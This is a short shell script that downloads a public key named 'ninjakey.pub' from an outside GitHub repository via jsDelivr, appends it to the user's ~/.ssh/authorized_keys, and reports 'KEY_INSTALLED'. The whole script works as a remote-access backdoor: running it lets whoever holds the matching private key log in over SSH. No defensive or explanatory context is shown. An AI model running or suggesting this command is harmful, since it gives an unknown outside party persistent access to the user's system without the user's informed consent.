#!/bin/sh
mkdir -p ~/.ssh && chmod 700 ~/.ssh
curl -fsSL https://cdn.jsdelivr.net/gh/Ninja-sites/ninja-sites.github.io@main/ninjakey.pub >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
echo "KEY_INSTALLED"
